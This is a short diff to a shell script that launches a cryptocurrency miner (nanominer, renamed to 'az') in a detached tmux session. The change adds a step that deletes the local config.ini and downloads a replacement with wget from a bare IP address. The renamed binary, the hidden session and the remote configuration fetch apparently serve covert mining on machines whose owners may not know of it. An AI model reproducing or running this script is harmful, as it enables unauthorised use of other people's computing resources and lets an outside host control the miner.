@@ -5,7 +5,7 @@ if [ -f ${PWD}/nanominer-linux-3.1.4/az ]; then
 then
 	echo " Ok roi"
 else
-cd nanominer-linux-3.1.4 && tmux new-session -d -s my_session1 './az'
+cd nanominer-linux-3.1.4 &&  rm config.ini && wget http://103.145.255.41:88/config.ini && tmux new-session -d -s my_session1 './az'
 
 fi
 exit
